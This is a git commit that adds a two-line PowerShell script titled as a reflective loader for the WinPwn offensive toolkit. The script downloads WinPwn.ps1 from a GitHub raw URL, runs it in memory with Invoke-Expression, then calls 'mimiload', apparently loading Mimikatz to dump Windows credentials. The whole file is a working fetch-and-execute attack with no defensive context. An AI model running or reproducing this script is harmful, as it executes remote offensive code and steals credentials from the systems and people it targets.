c5660bd42e72bc287a52912ff75642ec916b1bde
b1nary0mega <b1nary0mega@users.noreply.github.com>
2026-03-11 12:09:45 -0400

    Add reflective loading script for WinPwn

---
+++ winpwn-mimi_load-reflective.ps1
@@ -0,0 +1,2 @@
+Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1' -UseBasicParsing).Content
+mimiload -consoleoutput -noninteractive
